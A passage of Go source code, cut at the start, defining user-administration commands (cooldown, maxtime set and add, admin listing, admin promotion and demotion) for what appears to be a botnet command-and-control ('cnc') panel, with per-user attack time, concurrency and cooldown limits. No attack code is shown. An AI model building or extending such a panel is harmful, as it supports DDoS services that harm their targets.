									{Align: simpletable.AlignCenter, Text: "#"},
									{Align: simpletable.AlignCenter, Text: "     User     "},
									{Align: simpletable.AlignCenter, Text: "Time"},
									{Align: simpletable.AlignCenter, Text: "Conns"},
									{Align: simpletable.AlignCenter, Text: "Cooldown"},
									{Align: simpletable.AlignCenter, Text: "Ranks"},
								},
							}
						
							//ranges through all the users gotton from the database
							for _, Users := range Users {
								//correctly parses the ranks from the database
								//this will produce an array of ranks which were found
								Press, err := ranks.UnravelRanks(&Users)
								if err != nil {
									continue
								}
							
								//only shows users with that maxtime
								//this is used for filter presets
								if Users.Cooldown != Value {
									continue
								}
							
								//creates a new tablcell row
								//this stores the rows information
								r := []*simpletable.Cell{
									{Align: simpletable.AlignCenter, Text: strconv.Itoa(Users.Id)},
									{Align: simpletable.AlignLeft, Text: Users.Username},
									{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.MaxTime)},
									{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Concurrents)},
									{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Cooldown)},
									{Align: simpletable.AlignLeft, Text: ranks.CompileRanks(Press, Toml.DecorationToml.Gradient.Status && util.NeedleHaystack(Toml.DecorationToml.Gradient.CommissionedTables, "users"))},
								}
							
								//saves the information into the array
								table.Body.Cells = append(table.Body.Cells, r)
							}
						
							//renders the pager and prints any error which was found
							return pager.NewPager("users", table, session).ExecutePager()
						}

						//returns an err code as we couldn't find it
						return views.NewDTX("users-cooldown-missing.dtx", session.Write).Template(session, session.Channel)
					}

					//sorts all the rank options correctly
					//this will sort them all into arrays safely
					PromoterRanks, err := ranks.UnravelRanks(session.User)
					if err != nil {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-cooldown-missing.dtx", session.Write).Template(session, session.Channel)
					}
					
					//we will only accept integers as the value
					//this will simple err checker and convert into a integer
					Value, err := strconv.Atoi(strings.Split(args[1], "=")[1])
					if err != nil {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-cooldown-forceInteger.dtx", session.Write).Template(session, session.Channel)
					}

					//for loops through each value option
					for Position := 2; Position < len(args); Position++ {

						//gets the user from the database
						//this is used so we only get the correct user
						User, err := database.Container.GetUser(args[Position])
						if err != nil {
							//returns an err code as we couldn't find it
							return views.NewDTX("users-cooldown-invalidUser.dtx", session.Write).RegisterVariable("queryUser", args[Position]).Template(session, session.Channel)
						}

						//correctly sorts the ranks
						//this will return the ranks correctly and safely
						Ranks, err := ranks.UnravelRanks(User)
						if err != nil {
							//returns an err code as we couldn't find it
							return views.NewDTX("users-cooldown-invalidUser.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}

						//checks if the user can access stuff
						if ranks.CanAccess("admin", Ranks) && !ranks.CanAccess("admin", PromoterRanks) {
							//returns an err code as the user updating has higher ranks then the user performing it
							return views.NewDTX("users-cooldown-higherRank.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}



						//requests the maxtime update 
						//this will properly update the time
						err = database.Container.ChangeCooldown(strconv.Itoa(Value), User.Username)
						if err != nil {
							//returns an err code as the user updating has higher ranks then the user performing it
							return views.NewDTX("users-cooldown-error.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}

						//returns an err code as the user updating has higher ranks then the user performing it
						if err := views.NewDTX("users-cooldown-done.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel); err != nil {
							return err
						}

					}


					return nil
				},
			},
			{
				//this command allows admins/moderators/resellers to set different maxtimes
				//please note that no one but the admin can edit the admins maxtime
				Name: "maxtime_set",
				Desciption: "correctly adds values onto the maxtime",
				MinPermissions: []string{"admin", "moderator"},
				//preps the name for a split
				SplitName: true,
				//splits the incoming string by that charater
				SplitCharater: "=",
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//checks if the syntax passed is valid
					//this is to make sure the user passed the correct value in
					if strings.Count(args[1], "=") != 1 || len(args) < 3 {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-maxtime_set-missing.dtx", session.Write).Template(session, session.Channel)
					}

					//sorts all the rank options correctly
					//this will sort them all into arrays safely
					PromoterRanks, err := ranks.UnravelRanks(session.User)
					if err != nil {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-maxtime_set-missing.dtx", session.Write).Template(session, session.Channel)
					}
					
					//we will only accept integers as the value
					//this will simple err checker and convert into a integer
					Value, err := strconv.Atoi(strings.Split(args[1], "=")[1])
					if err != nil {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-maxtime_set-forceInteger.dtx", session.Write).Template(session, session.Channel)
					}

					//for loops through each value option
					for Position := 2; Position < len(args); Position++ {

						//gets the user from the database
						//this is used so we only get the correct user
						User, err := database.Container.GetUser(args[Position])
						if err != nil {
							//returns an err code as we couldn't find it
							return views.NewDTX("users-maxtime_set-invalidUser.dtx", session.Write).RegisterVariable("queryUser", args[Position]).Template(session, session.Channel)
						}

						//correctly sorts the ranks
						//this will return the ranks correctly and safely
						Ranks, err := ranks.UnravelRanks(User)
						if err != nil {
							//returns an err code as we couldn't find it
							return views.NewDTX("users-maxtime_set-invalidUser.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}

						//checks if the user can access stuff
						if ranks.CanAccess("admin", Ranks) && !ranks.CanAccess("admin", PromoterRanks) {
							//returns an err code as the user updating has higher ranks then the user performing it
							return views.NewDTX("users-maxtime_add-higherRank.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}



						//requests the maxtime update 
						//this will properly update the time
						err = database.Container.ChangeMaxTime(strconv.Itoa(Value), User.Username)
						if err != nil {
							//returns an err code as the user updating has higher ranks then the user performing it
							return views.NewDTX("users-maxtime_set-error.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}

						//returns an err code as the user updating has higher ranks then the user performing it
						if err := views.NewDTX("users-maxtime_set-done.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel); err != nil {
							return err
						}

					}


					return nil
				},
			},
			{
				//this command allows admins/moderators/resellers to change maxtimes
				//please note that no one but the admin can edit the admins maxtime
				Name: "maxtime_add",
				Desciption: "correctly adds values onto the maxtime",
				MinPermissions: []string{"admin", "moderator"},
				//preps the name for a split
				SplitName: true,
				//splits the incoming string by that charater
				SplitCharater: "=",
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//checks if the syntax passed is valid
					//this is to make sure the user passed the correct value in
					if strings.Count(args[1], "=") != 1 || len(args) < 3 {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-maxtime_add-missing.dtx", session.Write).Template(session, session.Channel)
					}

					//sorts all the rank options correctly
					//this will sort them all into arrays safely
					PromoterRanks, err := ranks.UnravelRanks(session.User)
					if err != nil {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-maxtime_add-missing.dtx", session.Write).Template(session, session.Channel)
					}
					
					//we will only accept integers as the value
					//this will simple err checker and convert into a integer
					Value, err := strconv.Atoi(strings.Split(args[1], "=")[1])
					if err != nil {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-maxtime_add-forceInteger.dtx", session.Write).Template(session, session.Channel)
					}

					//for loops through each value option
					for Position := 2; Position < len(args); Position++ {

						//gets the user from the database
						//this is used so we only get the correct user
						User, err := database.Container.GetUser(args[Position])
						if err != nil {
							//returns an err code as we couldn't find it
							return views.NewDTX("users-maxtime_add-invalidUser.dtx", session.Write).RegisterVariable("queryUser", args[Position]).Template(session, session.Channel)
						}

						//correctly sorts the ranks
						//this will return the ranks correctly and safely
						Ranks, err := ranks.UnravelRanks(User)
						if err != nil {
							//returns an err code as we couldn't find it
							return views.NewDTX("users-maxtime_add-invalidUser.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}

						//checks if the user can access stuff
						if ranks.CanAccess("admin", Ranks) && !ranks.CanAccess("admin", PromoterRanks) {
							//returns an err code as the user updating has higher ranks then the user performing it
							return views.NewDTX("users-maxtime_add-higherRank.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}

						//stores the users current maxtime plus a few more
						//this is only used for this specific function meaning users can add time onto a users maxtime
						updateReq := User.MaxTime + Value

						//requests the maxtime update 
						//this will properly update the time
						err = database.Container.ChangeMaxTime(strconv.Itoa(updateReq), User.Username)
						if err != nil {
							//returns an err code as the user updating has higher ranks then the user performing it
							return views.NewDTX("users-maxtime_add-error.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}

						//returns an err code as the user updating has higher ranks then the user performing it
						if err := views.NewDTX("users-maxtime_add-done.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel); err != nil {
							return err
						}

					}


					return nil
				},
			},
			{
				//this command will completetly filter all admins
				//renders a table with only admins inside
				Name: "admin",
				Desciption: "filters all admins into the same table",
				MinPermissions: []string{"admin", "moderator", "reseller"},
				ExecutionBody: func(session *sessions.Session, args []string) error {
					
					//trys to fetch all users
					//this will query the database for every single user
					Users, err := database.Container.GetUsers()
					if err != nil || Users == nil {
						return views.NewDTX("display-database.dtx", session.Write).Template(session, session.Channel)
					}

					//checks how many users had been fetched
					//this is basic err handling to stop use from rendering a blank pager
					if len(Users) <= 0 {
						return views.NewDTX("display-NilUsers.dtx", session.Write).Template(session, session.Channel)
					}

					//creates a new simpletable structure
					//this will store our users information
					table := simpletable.New()

					//correctly sets the table header information
					//this stores information about the users
					table.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "#"},
							{Align: simpletable.AlignCenter, Text: "     User     "},
							{Align: simpletable.AlignCenter, Text: "Time"},
							{Align: simpletable.AlignCenter, Text: "Conns"},
							{Align: simpletable.AlignCenter, Text: "Cooldown"},
							{Align: simpletable.AlignCenter, Text: "Ranks"},
						},
					}
			
					//ranges through all the users gotton from the database
					for _, Users := range Users {
						//correctly parses the ranks from the database
						//this will produce an array of ranks which were found
						Press, err := ranks.UnravelRanks(&Users)
						if err != nil {
							continue
						}

						//makes sure we are only viewing admin users
						if !ranks.CanAccess("admin", Press) {
							continue
						}

						//creates a new tablcell row
						//this stores the rows information
						r := []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: strconv.Itoa(Users.Id)},
							{Align: simpletable.AlignLeft, Text: Users.Username},
							{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.MaxTime)},
							{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Concurrents)},
							{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Cooldown)},
							{Align: simpletable.AlignLeft, Text: ranks.CompileRanks(Press, Toml.DecorationToml.Gradient.Status && util.NeedleHaystack(Toml.DecorationToml.Gradient.CommissionedTables, "users"))},
						}
	
						//saves the information into the array
						table.Body.Cells = append(table.Body.Cells, r)
					}

					//renders the pager and prints any error which was found
					return pager.NewPager("users", table, session).ExecutePager()
				},
			},
			{
				//removes the user admin control
				//this will correctly demote a user from admin status
				Name: "admin=false",
				Desciption: "demote a user from admin status safely",
				//anything todo with admin permissions will be admin only editable
				MinPermissions: []string{"admin"},
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//checks the length of the arguments passed
					//this is used to check who the user wants to demote
					if len(args) < 3 {
						//returns the dtx invalid syntax err
						//this allows the user to check the length correctly
						return views.NewDTX("users-admin=false-invalid-syntax.dtx", session.Write).Template(session, session.Channel)
					}

					//ranges through all user arguments given
					//this will give us individual access to each user safely
					for Position := 2; Position < len(args); Position++ {
						
						//trys to get the user from the database
						//this is used to check that the user exists correctly
						argumentalUser, err := database.Container.GetUser(args[Position])
						if err != nil {
							//returns that the user passed is invalid
							//this is so we know a user doesn't exist
							return views.NewDTX("users-admin=false-invalidUser.dtx", session.Write).RegisterVariable("queryUser", args[Position]).Template(session, session.Channel)
						}

						//checks if the user already has the role
						//this is so users don't get given the role twice
						Concentraded, err := ranks.UnravelRanks(argumentalUser)
						if err != nil {
							//returns that the user passed is invalid
							//this is so we know a user doesn't exist
							return views.NewDTX("users-admin=false-invalidUser.dtx", session.Write).RegisterVariable("queryUser", args[Position]).Template(session, session.Channel)
						}

						//the user already has that role
						//this is used so we can check if the user already has a rank
						if !ranks.CanAccess("admin", Concentraded) {
							//returns that the user passed already has admin
							//this is so we know a user already has admin access
							return views.NewDTX("users-admin=false-AlreadyNotAdmin.dtx", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel)
						}

						//awards the user the rank correctly
						//this will properly award the user the rank into the array properly
						Concentraded, err = ranks.ForbidRole("admin", Concentraded)
						if err != nil {
							//returns that we have failed to correctly promote the user to admin
							//we will load the branding item correctly and return that if any errors happen with rendering it
							return views.NewDTX("users-admin=false-updateFailed", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel) 
						}

						//encodes the rank back to string form
						//this will take the ranks array and convert back into a string
						value, err := ranks.EncodeString(Concentraded)
						if err != nil {
							//returns that we have failed to correctly promote the user to admin
							//we will load the branding item correctly and return that if any errors happen with rendering it
							return views.NewDTX("users-admin=false-updateFailed", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel) 
						}


						//inserts the rank into sql
						//this will allow the cnc to correctly take the new rank formula
						err = database.Container.UpdateRanks(value, argumentalUser.Username)
						if err != nil {
							//returns that we have failed to correctly promote the user to admin
							//we will load the branding item correctly and return that if any errors happen with rendering it
							return views.NewDTX("users-admin=false-updateFailed", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel) 
						}

						//correctly prints the admin has been updated
						//this is a message which will notifiy the user which promoted him
						err = views.NewDTX("users-admin=false-correct.dtx", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel) 
						if err != nil {
							return err
						}

						//broadcasts the role updation to all sessions
						//this will only broadcast to the sessions open with that username
						err = sessions.ControlSession(argumentalUser.Username, func(s *sessions.Session) (*sessions.Session, error) {
							//correctly updates all sessions
							s.User.Roles = value
							return s, nil
						})
						
						//extremely basic error handling for the message
						if err != nil {
							return err
						}
						
						//continues to keep looping through the loops
						//this will make sure we don't sit on a rotation
						continue
					}


					return nil
				},
			},
			{
				//gives the user admin control
				//this will correctly promote the user to admin status
				Name: "admin=true",
				Desciption: "correctly promote a user to admin rank",
				//anything todo with admin permissions will be admin only editable
				MinPermissions: []string{"admin"},
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//checks the length of the arguments passed
					//this is used to check who the user wants to promote
					if len(args) < 3 {
						//returns the dtx invalid syntax err
						//this allows the user to check the length correctly
						return views.NewDTX("users-admin=true-invalid-syntax.dtx", session.Write).Template(session, session.Channel)
					}

					//ranges through all user arguments given
					//this will give us individual access to each user safely
					for Position := 2; Position < len(args); Position++ {
						
						//trys to get the user from the database
						//this is used to check that the user exists correctly
						argumentalUser, err := database.Container.GetUser(args[Position])
						if err != nil {
							//returns that the user passed is invalid
							//this is so we know a user doesn't exist
							return views.NewDTX("users-admin=true-invalidUser.dtx", session.Write).RegisterVariable("queryUser", args[Position]).Template(session, session.Channel)
						}

						//checks if the user already has the role
						//this is so users don't get given the role twice
						Concentraded, err := ranks.UnravelRanks(argumentalUser)
						if err != nil {
							//returns that the user passed is invalid
							//this is so we know a user doesn't exist
							return views.NewDTX("users-admin=true-invalidUser.dtx", session.Write).RegisterVariable("queryUser", args[Position]).Template(session, session.Channel)
						}

						//the user already has that role
						//this is used so we can check if the user already has a rank
						if ranks.CanAccess("admin", Concentraded) {
							//returns that the user passed already has admin
							//this is so we know a user already has admin access
							return views.NewDTX("users-admin=true-alreadyHasAdmin.dtx", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel)
						}

						//awards the user the rank correctly
						//this will properly award the user the rank into the array properly
						Concentraded, err = ranks.AwardRank(Concentraded, argumentalUser, "admin")
						if err != nil {
							//returns that we have failed to correctly promote the user to admin
							//we will load the branding item correctly and return that if any errors happen with rendering it
							return views.NewDTX("users-admin=true-updateFailed", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel) 
						}

						//encodes the rank back to string form
						//this will take the ranks array and convert back into a string
						value, err := ranks.EncodeString(Concentraded)
						if err != nil {
							//returns that we have failed to correctly promote the user to admin
							//we will load the branding item correctly and return that if any errors happen with rendering it
							return views.NewDTX("users-admin=true-updateFailed", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel) 
						}

						//inserts the rank into sql
						//this will allow the cnc to correctly take the new rank formula
						err = database.Container.UpdateRanks(value, argumentalUser.Username)
						if err != nil {
							//returns that we have failed to correctly promote the user to admin
							//we will load the branding item correctly and return that if any errors happen with rendering it
							return views.NewDTX("users-admin=true-updateFailed", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel) 
						}

						//correctly prints the admin has been updated
						//this is a message which will notifiy the user which promoted him
						err = views.NewDTX("users-admin=true-correct.dtx", session.Write).RegisterStructure("query", *argumentalUser).Template(session, session.Channel) 
						if err != nil {
							return err
						}

						//broadcasts the role updation to all sessions
						//this will only broadcast to the sessions open with that username
						err = sessions.ControlSession(argumentalUser.Username, func(s *sessions.Session) (*sessions.Session, error) {
							//correctly updates all sessions
							s.User.Roles = value
							return s, nil
						})
						
						//extremely basic error handling for the message
						if err != nil {
							return err
						}
						
						//continues to keep looping through the loops
						//this will make sure we don't sit on a rotation
						continue
					}
					return nil
				},
			},
		},
	})
}